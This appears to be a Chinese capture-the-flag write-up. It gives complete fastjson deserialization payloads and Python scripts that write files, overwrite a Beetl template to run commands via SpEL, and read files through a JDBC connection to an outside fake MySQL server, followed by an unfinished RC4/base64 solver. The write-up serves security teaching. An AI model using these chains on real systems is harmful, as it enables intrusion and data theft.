class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>按道理来说，直接用应该就可以了，但这里存在一点坑。</p><p>直接用的话，查看<code>docker logs</code>就会看到</p><p><img src="/./VCTF/w_2_3.png"></p><p>报错了，查看这个类的构造方法（在<code>commons-io-2.7.jar</code>里查看）</p><p><img src="/./VCTF/w_2_2.png"></p><p>显然这是调用了上图第一个构造方法（根据类型可以判断）</p><p>在这个方法，需要传入的参数有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Writer writer, Charset charset, int bufferSize, boolean writeImmediately</span><br></pre></td></tr></table></figure><p>而上面原始payload传入的参数有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">writer, charsetName, bufferSize, writeImmediately</span><br></pre></td></tr></table></figure><p>参数名出了问题，把<code>charsetName</code>改成<code>charset</code>即可。</p><p>最终的payload：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span><span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span><span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span><span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;[data]&quot;</span><span class="punctuation">,</span><span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;end&quot;</span><span class="punctuation">:</span><span class="number">2147483647</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span><span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span><span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span><span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;[filename]&quot;</span><span class="punctuation">,</span><span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span><span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span><span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span><span class="punctuation">,</span><span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;trigger&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span><span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span><span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;trigger2&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span><span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span><span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;trigger3&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span><span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span><span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.input&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;$.branch&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span><span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://192.168.24.137:10800&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">data</span>):</span><br><span class="line">    data = data + <span class="string">&#x27; &#x27;</span>*(<span class="number">8195</span>-<span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">    r = req.post(url,data).text</span><br><span class="line">    <span class="comment">#print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url,filename,data</span>):</span><br><span class="line">    payload = <span class="string">&quot;&quot;&quot;&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;input&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&quot;[data]&quot;,&quot;start&quot;:0,&quot;end&quot;:2147483647&#125;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024&#125;,&quot;branch&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,&quot;writer&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,&quot;file&quot;:&quot;[filename]&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;append&quot;:false&#125;,&quot;charset&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024,&quot;writeImmediately&quot;:true&#125;,&quot;trigger&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:&#123;&quot;$ref&quot;:&quot;$.input&quot;&#125;,&quot;branch&quot;:&#123;&quot;$ref&quot;:&quot;$.branch&quot;&#125;,&quot;closeBranch&quot;:true&#125;,&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;&#125;,&quot;trigger2&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:&#123;&quot;$ref&quot;:&quot;$.input&quot;&#125;,&quot;branch&quot;:&#123;&quot;$ref&quot;:&quot;$.branch&quot;&#125;,&quot;closeBranch&quot;:true&#125;,&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;&#125;,&quot;trigger3&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:&#123;&quot;$ref&quot;:&quot;$.input&quot;&#125;,&quot;branch&quot;:&#123;&quot;$ref&quot;:&quot;$.branch&quot;&#125;,&quot;closeBranch&quot;:true&#125;,&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;&#125;&#125;&#125;&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;[data]&#x27;</span>,exp(data))</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;[filename]&#x27;</span>,filename)</span><br><span class="line"></span><br><span class="line">    datas=<span class="string">&quot;&quot;&quot;------WebKitFormBoundaryqq0zb65TgtmQAsBT</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;123&quot;; filename=&quot;chen&quot;,&quot;a&quot;:[payload],&quot;c&quot;:&quot;xi.jpg&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryqq0zb65TgtmQAsBT--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    datas = datas.replace(<span class="string">&#x27;[payload]&#x27;</span>,payload)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryqq0zb65TgtmQAsBT&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    datas = datas.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    r = req.post(url,data=datas,headers=headers).text</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line">login(url)</span><br><span class="line">upload(url+<span class="string">&#x27;/upload?action=uploadfile&#x27;</span>,<span class="string">&#x27;/tmp/test&#x27;</span>,<span class="string">&#x27;testtest&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着测试一下，发现文件能写进去了，那么就接着进行下一步。</p><p><strong>覆盖test.btl</strong></p><p>接着查看源码，可以知道还有一个<code>/flag</code>路由，用的<code>btl</code>模板，那么只要覆盖掉<code>test.btl</code>即可rce。</p><p>接下来是找<code>test.btl</code>的绝对路径，在docker里找，可知<code>test.btl</code>在<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates</code>文件夹下。</p><p>接着审代码，在这部分可以看到有一个<code>test</code>方法，可以允许我们重新定义<code>callPattern</code>白名单。</p><p>这个类的构造方法只允许我们使用<code>venom.elephantcms</code>里的方法。</p><p><img src="/./VCTF/w_2_5.png"></p><p>第一次覆盖<code>test.btl</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;@venom.elephantcms.common.WhiteListNativeSecurityManager.test(&#x27;org.springframework,java.beans,venom.elephantcms&#x27;)&#125;</span><br></pre></td></tr></table></figure><p>接着访问<code>/flag</code>，得到<code>ok</code>。</p><p>等待5s后再次覆盖<code>test.btl</code>，这次写的是rce的shell。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;@java.beans.Beans.instantiate(null,parameter.a).parseExpression(parameter.b).getValue()&#125;</span><br></pre></td></tr></table></figure><p>访问<code>/flag?a=org.springframework.expression.spel.standard.SpelExpressionParser&amp;b=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&#39;cat /flag&#39;).getInputStream()).next()</code>即可得到flag。</p><p>最终脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://192.168.24.137:10800&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">data</span>):</span><br><span class="line">    data = data + <span class="string">&#x27; &#x27;</span>*(<span class="number">8195</span>-<span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">    r = req.post(url,data).text</span><br><span class="line">    <span class="comment">#print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url,filename,data</span>):</span><br><span class="line">    payload = <span class="string">&quot;&quot;&quot;&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;input&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&quot;[data]&quot;,&quot;start&quot;:0,&quot;end&quot;:2147483647&#125;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024&#125;,&quot;branch&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.output.WriterOutputStream&quot;,&quot;writer&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;,&quot;file&quot;:&quot;[filename]&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;append&quot;:false&#125;,&quot;charset&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024,&quot;writeImmediately&quot;:true&#125;,&quot;trigger&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:&#123;&quot;$ref&quot;:&quot;$.input&quot;&#125;,&quot;branch&quot;:&#123;&quot;$ref&quot;:&quot;$.branch&quot;&#125;,&quot;closeBranch&quot;:true&#125;,&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;&#125;,&quot;trigger2&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:&#123;&quot;$ref&quot;:&quot;$.input&quot;&#125;,&quot;branch&quot;:&#123;&quot;$ref&quot;:&quot;$.branch&quot;&#125;,&quot;closeBranch&quot;:true&#125;,&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;&#125;,&quot;trigger3&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.XmlStreamReader&quot;,&quot;inputStream&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.io.input.TeeInputStream&quot;,&quot;input&quot;:&#123;&quot;$ref&quot;:&quot;$.input&quot;&#125;,&quot;branch&quot;:&#123;&quot;$ref&quot;:&quot;$.branch&quot;&#125;,&quot;closeBranch&quot;:true&#125;,&quot;httpContentType&quot;:&quot;text/xml&quot;,&quot;lenient&quot;:false,&quot;defaultEncoding&quot;:&quot;UTF-8&quot;&#125;&#125;&#125;&quot;&quot;&quot;</span></span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;[data]&#x27;</span>,exp(data))</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;[filename]&#x27;</span>,filename)</span><br><span class="line"></span><br><span class="line">    datas=<span class="string">&quot;&quot;&quot;------WebKitFormBoundaryqq0zb65TgtmQAsBT</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;123&quot;; filename=&quot;chen&quot;,&quot;a&quot;:[payload],&quot;c&quot;:&quot;xi.jpg&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryqq0zb65TgtmQAsBT--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    datas = datas.replace(<span class="string">&#x27;[payload]&#x27;</span>,payload)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryqq0zb65TgtmQAsBT&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    datas = datas.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    r = req.post(url,data=datas,headers=headers).text</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line">login(url)</span><br><span class="line"></span><br><span class="line">upload(url+<span class="string">&#x27;/upload?action=uploadfile&#x27;</span>,<span class="string">&#x27;/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/test.btl&#x27;</span>,<span class="string">&quot;$&#123;@venom.elephantcms.common.WhiteListNativeSecurityManager.test(&#x27;org.springframework,java.beans,venom.elephantcms&#x27;)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">r1 = req.get(url+<span class="string">&#x27;/flag&#x27;</span>).text</span><br><span class="line"><span class="built_in">print</span>(r1.strip())</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">upload(url+<span class="string">&#x27;/upload?action=uploadfile&#x27;</span>,<span class="string">&#x27;/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/templates/test.btl&#x27;</span>,<span class="string">&quot;&quot;&quot;$&#123;@java.beans.Beans.instantiate(null,parameter.a).parseExpression(parameter.b).getValue()&#125;&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">r2 = req.get(url+<span class="string">&quot;/flag?a=org.springframework.expression.spel.standard.SpelExpressionParser&amp;b=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&#x27;cat /flag&#x27;).getInputStream()).next()&quot;</span>).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r2.strip())</span><br></pre></td></tr></table></figure><p><img src="/./VCTF/w_2_6.png"></p><h3 id="mysql-jdbc-读文件"><a href="#mysql-jdbc-读文件" class="headerlink" title="mysql jdbc 读文件"></a>mysql jdbc 读文件</h3><p>在<code>pom.xml</code>里还有 <code>mysql-connector-java 5.1.49</code>的依赖，可以利用它来读文件。</p><p>参考链接：<a href="https://www.freebuf.com/vuls/341270.html">从BlackHat来看JDBC Attack</a></p><p><a href="https://blog.csdn.net/qq_42077227/article/details/130236560">fastjson 反序列化之mysql JDBC 利用</a></p><p><a href="https://xz.aliyun.com/t/12011?time__1311=mqmhBKD50KYIZDBqDTj186o7I/KWTRnvD&alichlgref=https://cn.bing.com/">JDBC MySQL任意文件读取分析</a></p><p>先看<code>com.mysql.jdbc.JDBC4Connection</code>的构造函数，</p><p><img src="/./VCTF/w_2_7.png"></p><p><code>info</code>是<code>Properties</code>类型的数据。</p><p>对比常见的jdbc链：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://127.0.0.1:3306/test?user=root&amp;password=123456&amp;maxAllowedPacket=655360</span><br></pre></td></tr></table></figure><p>可知<code>info</code>的内容来自<code>/test?</code>后边那部分。</p><p>接着是读文件，网上的payload大多数是rce的。</p><p>先在服务器运行一个 <a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server</a></p><p>要在<code>info</code>设置 <code>&quot;allowLoadLocalInfile&quot;:&quot;true&quot;</code>和<code>&quot;maxAllowedPacket&quot;:&quot;655360&quot;</code> ，缺少这两个参数就不能读到文件。</p><p>其他的就可以随便。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,</span><br><span class="line">&quot;hostToConnectTo&quot;:&quot;110.41.17.183&quot;,</span><br><span class="line">&quot;portToConnectTo&quot;:3306,</span><br><span class="line">&quot;info&quot;:&#123;</span><br><span class="line">&quot;user&quot;:&quot;root&quot;,</span><br><span class="line">&quot;password&quot;:&quot;123456&quot;,</span><br><span class="line">&quot;maxAllowedPacket&quot;:&quot;655360&quot;,</span><br><span class="line">&quot;allowLoadLocalInfile&quot;:&quot;true&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送过去即可在服务器读到文件内容。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&quot;,&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;110.41.17.183&quot;,&quot;portToConnectTo&quot;:3306,&quot;info&quot;:&#123;&quot;user&quot;:&quot;root&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;maxAllowedPacket&quot;:&quot;655360&quot;,&quot;allowLoadLocalInfile&quot;:&quot;true&quot;&#125;&#125;,&quot;c&quot;:&quot;.jpg</span><br></pre></td></tr></table></figure><p><img src="/./VCTF/w_2_9.png"></p><p><img src="/./VCTF/w_2_8.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h2><p>rc4加密+换表base64。</p><p>base64码表</p><p><img src="/./VCTF/r_1_1.png"></p><p>rc4的key和密文</p><p><img src="/./VCTF/r_1_2.png"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">128</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">128</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span 